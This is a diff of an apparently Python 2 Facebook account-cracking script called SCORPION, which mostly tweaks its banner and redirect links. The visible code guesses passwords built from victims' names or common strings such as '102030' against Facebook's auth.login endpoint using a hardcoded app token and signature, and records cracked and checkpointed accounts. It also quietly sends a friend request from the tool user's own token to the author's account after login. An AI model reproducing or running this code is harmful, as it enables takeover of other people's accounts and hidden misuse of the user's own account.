@@ -56,15 +56,15 @@ Y='\033[1;93m'
  
 #### LOGO ####
 logo = """ 
-\033[1;94m            WELCOME TO DEVIL'S WORLD 
-\033[1;91m░▒█▀▄▀█░▒█▀▀▄░░░▒█▀▀▄
-\033[1;93m░▒█▒█▒█░▒█▄▄▀░░░▒█░▒█
-\033[1;93m░▒█░░▒█░▒█░▒█░░░▒█▄▄█
-\033[1;91m        MR.DEVIL LORD OF DARK WORLD 
+\033[1;94m ♡>>>WELCOME TO DEVIL'S WORLD<<<<♡ 
+\033[1;91m  ░▒█▀▄▀█░▒█▀▀▄░░░▒█▀▀▄
+\033[1;93m  ░▒█▒█▒█░▒█▄▄▀░░░▒█░▒█
+\033[1;93m  ░▒█░░▒█░▒█░▒█░░░▒█▄▄█
+\033[1;91m    《MR.DEVIL LORD OF DARK WORLD》 
 \033[0;95m╭════════════════════════════════════════════╮
-\033[0;91m║\033[0;91mAUTHOR : \033[0;92mMR.DEVIL                   \033[0;91m      ║
-\033[0;91m║\033[0;91mTOOL nm :\033[0;92m Scorpion  version 0.2          \033[0;91m        
-\033[0;91m║ \033[0;91mMR.DEVIL :\033[0;92mPROGRAMMER & DARK HACKER \033[0;91m║
+\033[0;91m║\033[0;91mAUTHOR  :\033[0;92mMR.DEVIL                \033[0;91m      ║
+\033[0;91m║\033[0;91mTOOL nm :\033[0;92m SCORPION version 0.2    \033[0;91m     ║ 
+\033[0;91m║\033[0;91mMR.DEVIL:\033[0;92mPROGRAMMER & DARK HACKER \033[0;91m.    ║
 \033[0;95m╰════════════════════════════════════════════╯
 """
 CorrectUsername = "DARK"
@@ -81,10 +81,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
+            os.system('xdg-open https://www.facebook.com/Aamirsohailsroya')
     else:
         print "\033[1;96mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
+        os.system('xdg-open https://www.facebook.com/Aamirsohailsroya')
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -150,14 +150,14 @@ def login():
         time.sleep(0.05)
         print "\033[1;91m>>>\033[1;91m[2]\033[1;94m Login with access token "
         time.sleep(0.05)
-        print "\033[1;91m>>>\033[1;91m[3]\033[1;93m Download Access token"
+        print "\033[1;91m>>>\033[1;91m[3]\033[1;93m feed back"
 	time.sleep(0.05)
 	print "\033[1;91m>>>\033[1;91m[0]\033[1;96m Logout        "
         print 42*"\033[1;97m="
 	pilih_login()
  
 def pilih_login():
-	peak = raw_input("\n\033[1;91mChoose an Option═╬══►\033[1;95m")
+	peak = raw_input("\n\033[1;91mChoose an Option══►\033[1;95m")
 	if peak =="":
 		print "\x1b[1;91mFill in correctly"
 		pilih_login()
@@ -166,7 +166,7 @@ def pilih_login():
         elif peak =="2":
 	        tokenz()
         elif peak =="3":
-	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
+	        os.system('xdg-open https://www.facebook.com/Aamirsohailsroya')
 	        login()
 	elif unikers =="0":
 		jalan('Token Removed')
@@ -219,7 +219,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				jalan( '\n\x1b[1;95mLogin Successful...') 
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				os.system('xdg-open https://www.facebook.com/Aamirsohailsroya')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -452,7 +452,7 @@ def pilih_super():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = b['last_name'] + '12345'											
+						           pass4 = b['first_name'] + '12'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -518,7 +518,7 @@ def pilih_super():
 				                                                               cek.close()
 				                                                               cekpoint.append(user+pass6)	
 						                                           else:							
-								                               pass7 = b['last_name']+'123456'						
+								                               pass7 = '102030'						
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
 								                               q = json.load(data)						
 								                               if 'access_token' in q:		
